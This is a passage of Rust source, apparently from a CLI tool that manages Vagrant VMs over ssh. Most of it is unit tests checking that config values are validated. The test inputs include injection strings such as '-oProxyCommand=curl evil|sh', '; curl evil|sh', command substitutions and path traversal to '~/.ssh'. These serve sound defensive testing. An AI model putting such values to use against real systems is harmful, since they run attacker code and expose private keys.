                reason: "must not contain control characters".to_owned(),
            });
        }

        Ok(())
    }

    /// Returns the project directory on the VM host, e.g.
    /// `~/vms/myproject`.
    ///
    /// A trailing slash on `remote_root` is ignored so the
    /// result never contains a doubled separator.
    #[must_use]
    pub fn remote_project_dir(&self) -> String {
        format!("{}/{}", self.root(), self.project)
    }

    /// Returns the directory on the VM host used for an
    /// ephemeral (`scratch`) VM of this project.
    ///
    /// The project name is part of the path: `scratch pr-1`
    /// in two different projects must not resolve to the same
    /// directory, or the second boot extracts one project's
    /// Vagrantfile over the other's live `.vagrant/`.
    #[must_use]
    pub fn remote_scratch_dir(&self, name: &ScratchName) -> String {
        format!("{}/scratch/{}/{name}", self.root(), self.project)
    }

    /// Returns `remote_root` without any trailing slash.
    fn root(&self) -> &str {
        self.remote_root.trim_end_matches('/')
    }
}

/// Checks every character of `value` against `allowed`.
fn charset(
    field: &'static str,
    value: &str,
    allowed: fn(char) -> bool,
    expected: &str,
) -> Result<(), ConfigError> {
    if let Some(bad) = value.chars().find(|c| !allowed(*c)) {
        return Err(ConfigError::Invalid {
            field,
            reason: format!(
                "character {bad:?} is not allowed; use only \
                 {expected}"
            ),
        });
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn minimal() -> &'static str {
        "project = \"myproject\"\n"
    }

    fn parse(source: &str) -> Result<Config, ConfigError> {
        Config::parse(source, Path::new("bombyx.toml"), "vmhost")
    }

    /// Parses the minimal project file with an explicit host.
    ///
    /// The host no longer comes from the file being parsed, so
    /// a test about host values varies this argument rather than
    /// the TOML.
    fn parse_with_host(host: &str) -> Result<Config, ConfigError> {
        Config::parse(minimal(), Path::new("bombyx.toml"), host)
    }

    fn good() -> Config {
        parse(minimal()).unwrap()
    }

    fn scratch(name: &str) -> ScratchName {
        ScratchName::parse(name).unwrap()
    }

    #[test]
    fn parses_minimal_config_and_applies_defaults() {
        let cfg = good();
        assert_eq!(cfg.host, "vmhost");
        assert_eq!(cfg.project, "myproject");
        assert_eq!(cfg.vagrant_dir, "vagrant");
        assert_eq!(cfg.remote_root, "~/vms");
    }

    #[test]
    fn parses_explicit_overrides() {
        let src = "project = \"ledgerstone\"\n\
                   vagrant_dir = \"infra/vm\"\n\
                   remote_root = \"/srv/vms\"\n";
        let cfg = parse(src).unwrap();
        assert_eq!(cfg.vagrant_dir, "infra/vm");
        assert_eq!(cfg.remote_root, "/srv/vms");
    }

    #[test]
    fn rejects_a_vagrant_dir_that_escapes_the_project() {
        // `vagrant_dir` is joined onto the working directory,
        // and `Path::join` with an absolute operand *discards*
        // the left side -- so an absolute value makes `up`
        // archive that directory instead of the project's.
        // A repo shipping one of these had `bombyx up` tar the
        // operator's private keys and scp them to the host
        // named in the same file.
        //
        // The whole family, not just the case that prompted
        // the guard: two rooted spellings, a Windows drive
        // (which is *not* absolute on Unix, and the config
        // travels between platforms), a home reference, and
        // traversal in either position.
        for bad in [
            "/etc",
            "\\Windows",
            "C:/Users/igor/.ssh",
            "c:\\Users\\igor\\.ssh",
            "~/.ssh",
            "../../.ssh",
            "vagrant/../../.ssh",
            "./vagrant",
        ] {
            let src = format!("project = \"p\"\nvagrant_dir = {bad:?}\n");
            let err = parse(&src).unwrap_err();
            assert!(
                matches!(
                    err,
                    ConfigError::Invalid {
                        field: "vagrant_dir",
                        ..
                    }
                ),
                "{bad} must be rejected, got {err:?}"
            );
        }
    }

    #[test]
    fn accepts_a_relative_vagrant_dir() {
        for good in ["vagrant", "infra/vm", "a/b/c"] {
            let src = format!("project = \"p\"\nvagrant_dir = {good:?}\n");
            assert_eq!(parse(&src).unwrap().vagrant_dir, good);
        }
    }

    #[test]
    fn local_config_path_sits_beside_the_config() {
        let of = |p: &str| local_config_path(Path::new(p)).unwrap();

        assert_eq!(of("bombyx.toml"), Path::new("bombyx.local.toml"));
        assert_eq!(
            of("/repo/infra/bombyx.toml"),
            Path::new("/repo/infra/bombyx.local.toml")
        );
        // A `--config` pointing somewhere else keeps the same
        // rule, so the override is discoverable from the file
        // it overrides rather than being a fixed name.
        assert_eq!(of("staging.toml"), Path::new("staging.local.toml"));
        // The extension is replaced, not preserved. Documented
        // rather than fixed: two configs differing only by
        // extension would share one overlay.
        assert_eq!(of("staging.yaml"), Path::new("staging.local.toml"));
        assert_eq!(of("bombyx"), Path::new("bombyx.local.toml"));
    }

    #[test]
    fn overlay_replaces_only_the_fields_it_sets() {
        // An overlay naming one field must leave the rest
        // alone.
        let overlay: Overlay = toml::from_str("project = \"other\"").unwrap();
        let cfg = good().with_overlay(overlay);
        assert_eq!(cfg.project, "other");
        assert_eq!(cfg.host, "vmhost");
        assert_eq!(cfg.vagrant_dir, "vagrant");
        assert_eq!(cfg.remote_root, "~/vms");
    }

    #[test]
    fn with_overlay_does_not_apply_host() {
        // `host` is ranked against `--host` and the environment
        // by `resolve_host`, both of which outrank the file.
        // Applying it here as well would silently promote the
        // file above them, so this seam is asserted rather than
        // left to a comment.
        let overlay: Overlay = toml::from_str("host = \"my-vmhost\"").unwrap();
        assert_eq!(good().with_overlay(overlay).host, "vmhost");
    }

    #[test]
    fn overlay_can_set_every_project_field() {
        // Every project field must be overridable. This test is
        // what fails when a field is added to `Config` and to
        // `Overlay` but the two are never actually wired
        // together.
        let src = "project = \"p\"\n\
                   vagrant_dir = \"vm\"\nremote_root = \"/srv/v\"\n";
        let cfg = good().with_overlay(toml::from_str(src).unwrap());
        assert_eq!(cfg.project, "p");
        assert_eq!(cfg.vagrant_dir, "vm");
        assert_eq!(cfg.remote_root, "/srv/v");
    }

    /// Writes a base config plus an overlay, and loads them.
    ///
    /// Goes through [`Config::load`] rather than composing
    /// `with_overlay` and `validate` by hand: the order of
    /// those two is the security-relevant part, so a test that
    /// arranges the order itself would stay green if `load`
    /// stopped doing it that way.
    fn load_with_overlay(
        overlay: &str,
    ) -> (tempfile::TempDir, Result<Config, ConfigError>) {
        let dir = tempfile::tempdir().unwrap();
        let base = dir.path().join("bombyx.toml");
        std::fs::write(&base, minimal()).unwrap();
        std::fs::write(dir.path().join("bombyx.local.toml"), overlay).unwrap();
        // A per-developer file supplies the host, which is the
        // ordinary arrangement: the project file cannot carry
        // one. It is the lowest-precedence source, so an overlay
        // naming `host` still overrides it.
        write_user_file(dir.path(), "vmhost");
        let loaded = load(&base, &user_sources(dir.path()));
        (dir, loaded)
    }

    /// [`Config::load`] without the origin.
    ///
    /// Most tests are about the resulting config; the ones about
    /// provenance call `Config::load` directly and assert on the
    /// [`HostOrigin`] it returns.
    fn load(path: &Path, sources: &HostSources) -> Result<Config, ConfigError> {
        Config::load(path, sources).map(|(cfg, _origin)| cfg)
    }

    /// Writes a per-developer config naming `host`.
    fn write_user_file(dir: &Path, host: &str) {
        std::fs::write(
            dir.join(USER_CONFIG_FILE),
            format!("host = {host:?}\n"),
        )
        .unwrap();
    }

    /// Sources whose only entry is the per-developer directory.
    fn user_sources(dir: &Path) -> HostSources<'_> {
        HostSources {
            user_config_dir: Some(dir),
            ..HostSources::default()
        }
    }

    /// Sources naming a host on the command line.
    fn flag_sources(host: &str) -> HostSources<'_> {
        HostSources {
            flag: Some(host),
            ..HostSources::default()
        }
    }

    /// Writes the minimal project file into a fresh directory.
    fn project_dir(source: &str) -> (tempfile::TempDir, PathBuf) {
        let dir = tempfile::tempdir().unwrap();
        let base = dir.path().join("bombyx.toml");
        std::fs::write(&base, source).unwrap();
        (dir, base)
    }

    #[test]
    fn rejects_a_host_key_in_the_project_file() {
        // The design rule, asserted: the VM host belongs to the
        // developer, and this file is committed. Refused rather
        // than ignored, so a stale key cannot sit in a repo
        // aiming everyone's `destroy` at one person's machine.
        let (_dir, base) = project_dir("host = \"vmhost\"\nproject = \"p\"\n");
        let err = load(&base, &HostSources::default()).unwrap_err();
        assert!(matches!(err, ConfigError::HostInProjectFile { .. }));
        let text = err.to_string();
        // The message has to say where the line goes instead,
        // or it only reports a problem.
        assert!(text.contains("bombyx.local.toml"), "{text}");
        assert!(text.contains("committed"), "{text}");
    }

    #[test]
    fn a_host_key_is_refused_even_when_a_flag_supplies_one() {
        // Tempting to let the flag win and move on. It must not:
        // the committed key is the thing being removed, and a
        // run that succeeds is a run nobody fixes.
        let (_dir, base) = project_dir("host = \"vmhost\"\nproject = \"p\"\n");
        assert!(matches!(
            load(&base, &flag_sources("mine")).unwrap_err(),
            ConfigError::HostInProjectFile { .. }
        ));
    }

    #[test]
    fn reports_no_host_configured_when_nothing_supplies_one() {
        let (_dir, base) = project_dir(minimal());
        let err = load(&base, &HostSources::default()).unwrap_err();
        assert!(matches!(err, ConfigError::HostMissing { .. }));
        // Every way out is named, since the operator has to pick
        // one and the files are not discoverable by guessing.
        let text = err.to_string();
        assert!(text.contains("bombyx.local.toml"), "{text}");
        assert!(text.contains("--host"), "{text}");
        assert!(text.contains(HOST_ENV), "{text}");
    }

    #[test]
    fn takes_the_host_from_the_user_config_file() {
        let (dir, base) = project_dir(minimal());
        write_user_file(dir.path(), "my-vmhost");
        let sources = user_sources(dir.path());
        assert_eq!(load(&base, &sources).unwrap().host, "my-vmhost");
    }

    #[test]
    fn host_precedence_runs_flag_env_overlay_user_file() {
        // All four sources present at once, then removed one at
        // a time. Testing each in isolation would pass with any
        // ordering at all.
        let (dir, base) = project_dir(minimal());
        std::fs::write(
            dir.path().join("bombyx.local.toml"),
            "host = \"from-overlay\"\n",
        )
        .unwrap();
        write_user_file(dir.path(), "from-user-file");

        let all = HostSources {
            flag: Some("from-flag"),
            env: Some("from-env"),
            ..user_sources(dir.path())
        };
        assert_eq!(load(&base, &all).unwrap().host, "from-flag");

        let no_flag = HostSources { flag: None, ..all };
        assert_eq!(load(&base, &no_flag).unwrap().host, "from-env");

        let no_env = HostSources {
            env: None,
            ..no_flag
        };
        assert_eq!(load(&base, &no_env).unwrap().host, "from-overlay");

        std::fs::remove_file(dir.path().join("bombyx.local.toml")).unwrap();
        assert_eq!(load(&base, &no_env).unwrap().host, "from-user-file");
    }

    #[test]
    fn load_reports_which_source_won() {
        // The origin is what lets a caller *say* which host is in
        // force without re-deriving the ranking. Asserted for
        // every source, since a constant would satisfy any one of
        // them.
        let (dir, base) = project_dir(minimal());
        std::fs::write(
            dir.path().join("bombyx.local.toml"),
            "host = \"from-overlay\"\n",
        )
        .unwrap();
        write_user_file(dir.path(), "from-user-file");

        let origin_of =
            |sources: &HostSources| Config::load(&base, sources).unwrap().1;

        let user = user_sources(dir.path());
        assert_eq!(origin_of(&user), HostOrigin::Overlay);

        let env = HostSources {
            env: Some("from-env"),
            ..user
        };
        assert_eq!(origin_of(&env), HostOrigin::Env);

        let flag = HostSources {
            flag: Some("from-flag"),
            ..env
        };
        assert_eq!(origin_of(&flag), HostOrigin::Flag);

        std::fs::remove_file(dir.path().join("bombyx.local.toml")).unwrap();
        assert_eq!(origin_of(&user), HostOrigin::UserFile);
    }

    #[test]
    fn an_overlay_host_is_taken_rather_than_left_in_place() {
        // `with_overlay` ignores `host`, and this is what makes
        // that safe rather than merely intended: by the time the
        // overlay is merged the field is empty, so no later change
        // to the merge can resurrect a value that two other
        // sources outrank.
        let mut overlay = Overlay {
            host: Some("from-overlay".to_owned()),
            ..Overlay::default()
        };
        let sources = HostSources::default();
        let (host, origin) =
            resolve_host(&sources, Some(&mut overlay), None).unwrap();
        assert_eq!(host, "from-overlay");
        assert_eq!(origin, HostOrigin::Overlay);
        assert_eq!(overlay.host, None);
    }

    #[test]
    fn an_invalid_host_names_the_source_that_supplied_it() {
        // Reported as a plain field error, the only path in the
        // message was the project file's -- the one file that must
        // not carry a host, so it sent the operator to edit the
        // wrong thing.
        let (dir, base) = project_dir(minimal());
        write_user_file(dir.path(), "-oProxyCommand=x");
        let err = load(&base, &user_sources(dir.path())).unwrap_err();
        let text = err.to_string();
        assert!(matches!(err, ConfigError::InvalidHost { .. }), "{text}");
        assert!(text.contains(USER_CONFIG_FILE), "{text}");
        assert!(!text.contains("bombyx.toml"), "{text}");

        // And the flag names itself rather than a file.
        let err = load(&base, &flag_sources("-oProxyCommand=x")).unwrap_err();
        assert!(err.to_string().contains("--host"), "{err}");
    }

    #[test]
    fn a_symlinked_user_config_is_followed() {
        // The symlink refusal exists because a *repo* can commit
        // one beside the project file. Nothing in a clone can
        // touch the operator's own config directory, and every
        // ordinary dotfile manager (stow, chezmoi, a hand-made
        // `ln -s`) symlinks exactly this file -- which made bombyx
        // fail on every subcommand with a message that never
        // mentioned symlinks.
        let (dir, base) = project_dir(minimal());
        let real = dir.path().join("real-config.toml");
        std::fs::write(&real, "host = \"linked-host\"\n").unwrap();

        let link = dir.path().join(USER_CONFIG_FILE);
        if !symlink_file(&real, &link) {
            // Windows needs a privilege for this; the guarantee is
            // asserted wherever the test can create a link.
            return;
        }

        assert_eq!(
            load(&base, &user_sources(dir.path())).unwrap().host,
            "linked-host"
        );
    }

    #[test]
    fn a_symlinked_project_config_is_still_refused() {
        // The other half of the same rule, and the reason it
        // exists: pointed at a private key, the TOML parse error
        // would echo a line of it to stderr.
        let dir = tempfile::tempdir().unwrap();
        let real = dir.path().join("real.toml");
        std::fs::write(&real, minimal()).unwrap();
        let link = dir.path().join("bombyx.toml");
        if !symlink_file(&real, &link) {
            return;
        }
        assert!(matches!(
            load(&link, &flag_sources("vmhost")).unwrap_err(),
            ConfigError::NotAFile(_)
        ));
    }

    /// Creates a file symlink, or `false` where not permitted.
    fn symlink_file(target: &Path, link: &Path) -> bool {
        #[cfg(windows)]
        let result = std::os::windows::fs::symlink_file(target, link);
        #[cfg(not(windows))]
        let result = std::os::unix::fs::symlink(target, link);
        result.is_ok()
    }

    #[test]
    fn an_empty_host_env_var_counts_as_unset() {
        // An exported-but-empty variable is how a shell says "no
        // value". Taking it literally would report an empty-field
        // error naming a file the operator never edited.
        let (dir, base) = project_dir(minimal());
        write_user_file(dir.path(), "my-vmhost");
        let sources = HostSources {
            env: Some("  "),
            ..user_sources(dir.path())
        };
        assert_eq!(load(&base, &sources).unwrap().host, "my-vmhost");
    }

    #[test]
    fn a_broken_user_config_is_not_read_when_a_flag_wins() {
        // `--host` has to work on a machine whose per-developer
        // file is missing, unreadable or malformed -- that is
        // half the point of having a flag.
        let (dir, base) = project_dir(minimal());
        std::fs::write(dir.path().join(USER_CONFIG_FILE), "host = ").unwrap();
        let sources = HostSources {
            flag: Some("mine"),
            user_config_dir: Some(dir.path()),
            env: None,
        };
        assert_eq!(load(&base, &sources).unwrap().host, "mine");
    }

    #[test]
    fn a_user_config_rejects_an_unknown_key() {
        // Same rule as the overlay: a typo in a file nobody
        // reads twice must be an error, not a setting that does
        // nothing.
        let (dir, base) = project_dir(minimal());
        std::fs::write(dir.path().join(USER_CONFIG_FILE), "hsot = \"x\"\n")
            .unwrap();
        let sources = HostSources {
            user_config_dir: Some(dir.path()),
            ..HostSources::default()
        };
        let err = load(&base, &sources).unwrap_err();
        assert!(matches!(err, ConfigError::Parse { .. }));
        assert!(err.to_string().contains(USER_CONFIG_FILE));
    }

    #[test]
    fn a_user_config_without_a_host_is_not_a_host() {
        // The file exists and parses but names nothing, which
        // must read the same as no file at all.
        let (dir, base) = project_dir(minimal());
        std::fs::write(dir.path().join(USER_CONFIG_FILE), "\n").unwrap();
        let sources = HostSources {
            user_config_dir: Some(dir.path()),
            ..HostSources::default()
        };
        assert!(matches!(
            load(&base, &sources).unwrap_err(),
            ConfigError::HostMissing { .. }
        ));
    }

    #[test]
    fn a_host_from_the_environment_is_still_validated() {
        // The charset check used to guard a repo-supplied value.
        // It now guards the argv instead: every remaining source
        // reaches `ssh` as its first argument, and a mistake can
        // fill any of them in. The file sources are covered by
        // `an_invalid_host_names_the_source_that_supplied_it`;
        // this is the environment, which no file check reaches.
        let (dir, base) = project_dir(minimal());
        let sources = HostSources {
            env: Some("-oProxyCommand=x"),
            ..user_sources(dir.path())
        };
        let err = load(&base, &sources).unwrap_err();
        assert!(matches!(err, ConfigError::InvalidHost { .. }), "{err}");
        assert!(err.to_string().contains(HOST_ENV), "{err}");
    }

    /// [`config_dir_from`] against a fixed environment.
    fn config_dir(vars: &[(&str, &str)], windows: bool) -> Option<PathBuf> {
        let owned: Vec<(String, String)> = vars
            .iter()
            .map(|(k, v)| ((*k).to_owned(), (*v).to_owned()))
            .collect();
        config_dir_from(
            move |key| {
                owned.iter().find(|(k, _)| k == key).map(|(_, v)| v.clone())
            },
            windows,
        )
    }

    #[test]
    fn user_config_dir_prefers_its_env_var_then_the_platform_ones() {
        // The override first, then the platform's own variable.
        assert_eq!(
            config_dir(
                &[
                    (CONFIG_DIR_ENV, "/over"),
                    ("APPDATA", "/app"),
                    ("HOME", "/home/i"),
                ],
                true
            ),
            Some(PathBuf::from("/over"))
        );
        assert_eq!(
            config_dir(
                &[("XDG_CONFIG_HOME", "/xdg"), ("HOME", "/home/i")],
                false
            ),
            Some(Path::new("/xdg").join("bombyx"))
        );
        assert_eq!(
            config_dir(&[("HOME", "/home/i")], false),
            Some(Path::new("/home/i").join(".config").join("bombyx"))
        );
        // Nothing usable in the environment: bombyx cannot guess,
        // and a relative guess would read a host out of the repo.
        assert_eq!(config_dir(&[], false), None);
        assert_eq!(config_dir(&[("APPDATA", "/app")], false), None);
    }

    #[test]
    fn appdata_is_consulted_only_on_windows() {
        // Documented as the Windows location, and it was checked
        // on every platform. `APPDATA` is routinely exported in
        // processes that are not Windows -- under WSL via
        // `WSLENV`, under Wine, in some CI images -- where it beat
        // `$HOME/.config` and made bombyx read a host out of a
        // file the docs said applied only to Windows.
        let vars = [("APPDATA", "/app"), ("HOME", "/home/i")];
        assert_eq!(
            config_dir(&vars, true),
            Some(Path::new("/app").join("bombyx"))
        );
        assert_eq!(
            config_dir(&vars, false),
            Some(Path::new("/home/i").join(".config").join("bombyx"))
        );
        // On Windows the home fallback is *not* used: a machine
        // with no APPDATA is one bombyx should not guess about.
        assert_eq!(config_dir(&[("HOME", "/home/i")], true), None);
    }

    #[test]
    fn a_config_dir_that_is_not_anchored_counts_as_unset() {
        // The whole family, not just the blank case that prompted
        // the guard. Each of these resolves against the working
        // directory -- which for this tool means taking the VM
        // host out of whatever repo bombyx was run in, the one
        // thing this design removes. `..` walks out of the tree,
        // and `C:cfg` is drive-*relative*: it resolves against
        // that drive's current directory.
        for bad in [
            "", "  ", ".", "..", "cfg", "cfg/", "./cfg", "C:cfg", "~/cfg",
        ] {
            assert_eq!(
                config_dir(&[(CONFIG_DIR_ENV, bad), ("HOME", "/h")], false),
                Some(Path::new("/h").join(".config").join("bombyx")),
                "{bad:?} must be ignored"
            );
        }
        // And the anchored spellings that must still work.
        for good in ["/srv/cfg", "\\\\srv\\cfg", "C:/cfg", "d:\\cfg"] {
            assert_eq!(
                config_dir(&[(CONFIG_DIR_ENV, good)], false),
                Some(PathBuf::from(good)),
                "{good:?} must be accepted"
            );
        }
    }

    #[test]
    fn an_empty_overlay_file_changes_nothing() {
        // A developer who clears the file, rather than deleting
        // it, must get the committed configuration -- this is
        // the present-but-empty branch, which absence does not
        // exercise.
        let (_dir, loaded) = load_with_overlay("");
        assert_eq!(loaded.unwrap(), good());
    }

    #[test]
    fn an_overlay_cannot_smuggle_an_ssh_option() {
        // `host` reaches `ssh` as its first positional
        // argument, and neither ssh nor scp honours `--`, so a
        // leading `-` is read as an option. The overlay must not
        // be the one source that skips that check.
        let (_dir, loaded) = load_with_overlay("host = \"-oProxyCommand=x\"");
        let err = loaded.unwrap_err();
        assert!(matches!(err, ConfigError::InvalidHost { .. }), "{err}");
        // And the message names the file holding the value.
        assert!(err.to_string().contains("bombyx.local.toml"), "{err}");
    }

    #[test]
    fn an_overlay_cannot_smuggle_an_escaping_vagrant_dir() {
        // The other half of the same rule, and the one with the
        // worse outcome: an absolute `vagrant_dir` makes `up`
        // archive that directory instead of the project's.
        let (_dir, loaded) = load_with_overlay("vagrant_dir = \"/etc\"");
        assert!(matches!(
            loaded.unwrap_err(),
            ConfigError::Invalid {
                field: "vagrant_dir",
                ..
            }
        ));
    }

    #[test]
    fn an_overlay_rejects_an_unknown_key() {
        // A typo must be an error rather than a setting that
        // silently does nothing -- and the message has to name
        // the overlay, since the operator has two files open
        // and only one of them is at fault.
        let (_dir, loaded) = load_with_overlay("hsot = \"x\"");
        let err = loaded.unwrap_err();
        assert!(matches!(err, ConfigError::Parse { .. }));
        let text = err.to_string();
        assert!(text.contains("bombyx.local.toml"), "{text}");
        assert!(text.contains("hsot"), "{text}");
    }

    #[test]
    fn an_overlay_that_is_not_a_regular_file_is_refused() {
        // A derived path pointing at a directory or a symlink
        // is not "no overlay": it is a state to report. A repo
        // can create either one.
        let dir = tempfile::tempdir().unwrap();
        let base = dir.path().join("bombyx.toml");
        std::fs::write(&base, minimal()).unwrap();
        std::fs::create_dir(dir.path().join("bombyx.local.toml")).unwrap();

        assert!(matches!(
            load(&base, &flag_sources("vmhost")).unwrap_err(),
            ConfigError::NotAFile(_)
        ));
    }

    #[test]
    fn an_oversized_config_is_refused() {
        let dir = tempfile::tempdir().unwrap();
        let base = dir.path().join("bombyx.toml");
        // `usize::try_from` rather than `as`: the cap is a
        // `u64`, and a bare cast is a truncation waiting for a
        // 32-bit target.
        let over = usize::try_from(MAX_CONFIG_BYTES).unwrap() + 1;
        std::fs::write(&base, "#".repeat(over)).unwrap();

        assert!(matches!(
            load(&base, &flag_sources("vmhost")).unwrap_err(),
            ConfigError::TooLarge(_)
        ));
    }

    #[test]
    fn local_config_path_declines_a_path_with_no_file_name() {
        // `..` and a bare directory have no stem to build on,
        // and answering with a sibling path would put the
        // overlay outside the directory it belongs to.
        assert_eq!(local_config_path(Path::new("..")), None);
        assert_eq!(local_config_path(Path::new("")), None);
    }

    #[test]
    fn accepts_a_user_at_host_destination() {
        let host = "igor@vmhost.local";
        assert_eq!(parse_with_host(host).unwrap().host, host);
    }

    #[test]
    fn rejects_invalid_toml() {
        let err = parse("project = ").unwrap_err();
        assert!(matches!(err, ConfigError::Parse { .. }));
        assert!(err.to_string().contains("bombyx.toml"));
    }

    #[test]
    fn rejects_missing_required_field() {
        let err = parse("vagrant_dir = \"vm\"\n").unwrap_err();
        assert!(matches!(err, ConfigError::Parse { .. }));
    }

    #[test]
    fn rejects_an_unknown_key() {
        // A typo must be reported, not silently defaulted:
        // the symptom would otherwise be a push into the
        // wrong remote directory.
        let src = "project = \"p\"\n\
                   vagrantdir = \"infra/vm\"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(err, ConfigError::Parse { .. }));
        assert!(err.to_string().contains("vagrantdir"));
    }

    #[test]
    fn rejects_empty_host() {
        // `--host ""` was typed, so it is reported as an empty
        // field rather than treated as unset.
        let err = parse_with_host("").unwrap_err();
        assert!(matches!(err, ConfigError::Empty { field: "host" }));
    }

    #[test]
    fn rejects_whitespace_only_project() {
        let src = "project = \"  \"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(err, ConfigError::Empty { field: "project" }));
    }

    #[test]
    fn rejects_empty_vagrant_dir() {
        let src = "project = \"p\"\nvagrant_dir = \"\"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(
            err,
            ConfigError::Empty {
                field: "vagrant_dir"
            }
        ));
    }

    #[test]
    fn rejects_empty_remote_root() {
        let src = "project = \"p\"\nremote_root = \"\"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(
            err,
            ConfigError::Empty {
                field: "remote_root"
            }
        ));
    }

    #[test]
    fn rejects_a_host_that_is_an_ssh_option() {
        // The headline case: a cloned repo must not be able
        // to run code on this workstation.
        let err = parse_with_host("-oProxyCommand=curl evil|sh").unwrap_err();
        assert!(matches!(err, ConfigError::Invalid { field: "host", .. }));
        assert!(err.to_string().contains("option"));
    }

    #[test]
    fn rejects_a_host_with_shell_metacharacters() {
        for host in ["a;id", "a$(id)", "a b", "a`id`", "a/b"] {
            assert!(
                parse_with_host(host).is_err(),
                "host {host:?} must be rejected"
            );
        }
    }

    #[test]
    fn rejects_a_remote_root_with_shell_metacharacters() {
        let src = "project = \"p\"\n\
                   remote_root = \"~/vms; curl evil|sh #\"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(
            err,
            ConfigError::Invalid {
                field: "remote_root",
                ..
            }
        ));
    }

    /// Asserts `remote_root` is refused as an invalid field.
    fn assert_root_rejected(root: &str) {
        let src = format!("project = \"p\"\nremote_root = {root:?}\n");
        let err = parse(&src).unwrap_err();
        assert!(
            matches!(
                err,
                ConfigError::Invalid {
                    field: "remote_root",
                    ..
                }
            ),
            "remote_root {root:?} must be rejected, got {err}"
        );
    }

    #[test]
    fn rejects_a_traversal_segment_in_remote_root() {
        // `rm -rf` on a teardown path would otherwise escape the
        // configured root: `remote_root = "~/.."` with
        // `project = "igor"` targets the whole home directory.
        for root in ["~/..", "/srv/../..", "~/vms/../other"] {
            assert_root_rejected(root);
        }
    }

    #[test]
    fn rejects_a_single_dot_segment_in_remote_root() {
        // A `.` adds a segment without adding depth. This was
        // the hole in the first version of the guard: `"/."`
        // with `project = "etc"` looked two segments deep and
        // resolved to `/etc`.
        for root in ["/.", "~/.", "/././etc", "~/./x", "~/vms/."] {
            assert_root_rejected(root);
        }
    }

    #[test]
    fn rejects_an_unrooted_remote_root() {
        // A relative root resolves against the SSH login
        // directory, which makes the depth check meaningless.
        for root in ["..", ".", "vms", "vms/deep"] {
            assert_root_rejected(root);
        }
    }

    #[test]
    fn rejects_a_remote_root_with_no_real_depth() {
        // `/` or `~` would put the project directory -- which
        // bombyx creates, writes into, and deletes -- at the top
        // level or directly in the home directory.
        for root in ["/", "~", "~/", "//", "///"] {
            assert_root_rejected(root);
        }
    }

    #[test]
    fn accepts_rooted_remote_roots_of_real_depth() {
        // The dotted name is the important one: the check is per
        // segment, not a substring search.
        for root in ["~/vms", "~/vms.d", "/srv/vms", "/srv/vms/deep", "~/v/"] {
            let src = format!("project = \"p\"\nremote_root = {root:?}\n");
            assert!(parse(&src).is_ok(), "remote_root {root:?} must parse");
        }
    }

    #[test]
    fn path_segments_measures_depth_not_characters() {
        assert_eq!(path_segments("~/vms/myproject"), vec!["vms", "myproject"]);
        assert_eq!(path_segments("//x//y"), vec!["x", "y"]);
        assert_eq!(path_segments("~"), Vec::<&str>::new());
        // `.` is kept, so a caller can reject it.
        assert_eq!(path_segments("~/./x"), vec![".", "x"]);
    }

    #[test]
    fn rejects_a_non_leading_tilde_in_remote_root() {
        let src = "project = \"p\"\n\
                   remote_root = \"/srv/~igor\"\n";
        let err = parse(src).unwrap_err();
        assert!(err.to_string().contains("first character"));
    }

    #[test]
    fn rejects_a_project_that_is_not_one_segment() {
        let src = "project = \"../../etc\"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(
            err,
            ConfigError::Invalid {
                field: "project",
                ..
            }
        ));
    }

    #[test]
    fn rejects_a_vagrant_dir_that_looks_like_a_flag() {
        let src = "project = \"p\"\n\
                   vagrant_dir = \"--exclude=x\"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(
            err,
            ConfigError::Invalid {
                field: "vagrant_dir",
                ..
            }
        ));
    }

    #[test]
    fn rejects_a_vagrant_dir_with_control_characters() {
        let src = "project = \"p\"\n\
                   vagrant_dir = \"a\\nb\"\n";
        let err = parse(src).unwrap_err();
        assert!(err.to_string().contains("control characters"));
    }

    #[test]
    fn accepts_a_windows_vagrant_dir() {
        let src = "project = \"p\"\n\
                   vagrant_dir = 'infra\\vm'\n";
        assert_eq!(parse(src).unwrap().vagrant_dir, r"infra\vm");
    }

    #[test]
    fn builds_remote_project_dir() {
        assert_eq!(good().remote_project_dir(), "~/vms/myproject");
    }

    #[test]
    fn remote_project_dir_ignores_trailing_slash() {
        let src = "project = \"p\"\nremote_root = \"/srv/\"\n";
        assert_eq!(parse(src).unwrap().remote_project_dir(), "/srv/p");
    }

    #[test]
    fn scratch_dir_is_scoped_to_the_project() {
        // Without the project segment, `scratch pr-1` from
        // two projects lands in one directory and the second
        // boot overwrites the first's `.vagrant/`.
        assert_eq!(
            good().remote_scratch_dir(&scratch("pr-1234")),
            "~/vms/scratch/myproject/pr-1234"
        );
    }

    #[test]
    fn scratch_dirs_of_two_projects_do_not_collide() {
        let a = good();
        let src = "project = \"ledgerstone\"\n";
        let b = parse(src).unwrap();
        let name = scratch("pr-1");
        assert_ne!(a.remote_scratch_dir(&name), b.remote_scratch_dir(&name));
    }

    #[test]
    fn load_reports_missing_file() {
        let path = Path::new("definitely-not-here-bombyx.toml");
        let err = load(path, &flag_sources("vmhost")).unwrap_err();
        assert!(matches!(err, ConfigError::NotFound(_)));
        assert!(err.to_string().contains("config file not found"));
    }

    #[test]
    fn load_reads_an_existing_file() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("bombyx.toml");
        std::fs::write(&path, minimal()).unwrap();
        let cfg = load(&path, &flag_sources("vmhost")).unwrap();
        assert_eq!(cfg.project, "myproject");
    }

    #[test]
    fn load_reports_a_directory_as_not_a_file() {
        // Was a `Read` error carrying whatever the OS said,
        // which differs per platform ("Is a directory" on Unix,
        // "Access is denied" on Windows) and explains nothing.
        // The type check that keeps a symlinked overlay from
        // being read now answers this case first, and says what
        // is actually wrong.
        let dir = tempfile::tempdir().unwrap();
        let err = load(dir.path(), &flag_sources("vmhost")).unwrap_err();
        assert!(matches!(err, ConfigError::NotAFile(_)), "{err:?}");
    }
}
